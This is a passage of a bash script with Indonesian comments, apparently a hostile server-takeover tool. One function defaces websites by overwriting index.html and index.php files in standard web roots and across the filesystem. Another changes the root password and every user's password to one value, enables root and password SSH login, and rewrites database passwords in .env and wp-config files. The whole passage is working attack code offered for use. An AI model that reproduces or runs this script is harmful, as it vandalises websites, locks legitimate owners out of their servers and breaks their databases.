# FUNGSI DEFACE WEBSITE
# ==============================================
deface_website() {
    echo -e "\n${PURPLE}ğŸ¨ ====== DEFACE WEBSITE ====== ğŸ¨${NC}"
    echo -e "${WHITE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    
    # Backup dulu
    backup_files
    
    echo -e "\n${PURPLE}[1/6] Menyiapkan file HTML...${NC}"
    echo "$HTML_CONTENT" > /tmp/r3nndzz.html
    echo -e "${GREEN}  âœ… HTML siap: /tmp/r3nndzz.html${NC}"
    
    echo -e "\n${PURPLE}[2/6] Mendeface website...${NC}"
    
    WEB_LOCATIONS=(
        "/var/www/html/index.html"
        "/var/www/html/index.php"
        "/var/www/pterodactyl/public/index.html"
        "/var/www/pterodactyl/public/index.php"
        "/var/www/pterodactyl/resources/views/templates/index.blade.php"
        "/home/*/public_html/index.html"
        "/home/*/public_html/index.php"
        "/usr/local/www/index.html"
        "/usr/local/apache2/htdocs/index.html"
        "/opt/lampp/htdocs/index.html"
        "/var/www/nginx/html/index.html"
    )
    
    DEFACE_COUNT=0
    for loc in "${WEB_LOCATIONS[@]}"; do
        eval "for f in $loc; do
            if [ -f \"\$f\" ]; then
                cp /tmp/r3nndzz.html \"\$f\" 2>/dev/null
                echo -e \"${GREEN}    âœ… \$f${NC}\"
                ((DEFACE_COUNT++))
            fi
        done" 2>/dev/null
    done
    
    # Cari semua file index.html di seluruh server
    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -20 | while read file; do
        if [ -f "$file" ] && [ -w "$file" ]; then
            cp /tmp/r3nndzz.html "$file" 2>/dev/null
            echo -e "${GREEN}    âœ… $file${NC}"
            ((DEFACE_COUNT++))
        fi
    done
    
    echo -e "\n${GREEN}  âœ… Total $DEFACE_COUNT file berhasil dideface${NC}"
}

# ==============================================
# FUNGSI GANTI PASSWORD VPS
# ==============================================
change_vps_password() {
    echo -e "\n${PURPLE}ğŸ” ====== GANTI PASSWORD VPS ====== ğŸ”${NC}"
    echo -e "${WHITE}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    
    echo -e "\n${PURPLE}[3/6] Mengganti password root...${NC}"
    echo "root:$NEW_PASS" | chpasswd
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}  âœ… Password root: ${NEW_PASS}${NC}"
    fi
    
    echo -e "\n${PURPLE}[4/6] Mencari semua user...${NC}"
    
    USERS=$(awk -F: '$3>=1000 && $1!="nobody" {print $1}' /etc/passwd)
    COMMON_USERS=("admin" "ubuntu" "centos" "debian" "ftp" "www-data" "mysql" "postgres")
    
    for user in "${COMMON_USERS[@]}"; do
        if id "$user" &>/dev/null; then
            USERS="$USERS $user"
        fi
    done
    
    USERS=$(echo "$USERS" | tr ' ' '\n' | sort -u | tr '\n' ' ')
    
    SUCCESS=0
    for user in $USERS; do
        echo "$user:$NEW_PASS" | chpasswd 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}    âœ… $user -> ${NEW_PASS}${NC}"
            ((SUCCESS++))
        fi
    done
    
    echo -e "\n${GREEN}  âœ… Total $SUCCESS user berhasil diganti passwordnya${NC}"
    
    echo -e "\n${PURPLE}[5/6] Mengupdate SSH config...${NC}"
    cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
    echo -e "${GREEN}  âœ… SSH siap dengan password${NC}"
    
    echo -e "\n${PURPLE}[6/6] Mencari file konfigurasi...${NC}"
    find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head -10 | while read file; do
        if [ -f "$file" ] && [ -w "$file" ]; then
            cp "$file" "$file.bak"
            sed -i "s/DB_PASSWORD=.*/DB_PASSWORD=$NEW_PASS/" "$file" 2>/dev/null
            sed -i "s/define('DB_PASSWORD'.*/define('DB_PASSWORD', '$NEW_PASS');/" "$file" 2>/dev/null
            echo -e "${GREEN}    âœ… $file${NC}"
        fi
    done
}

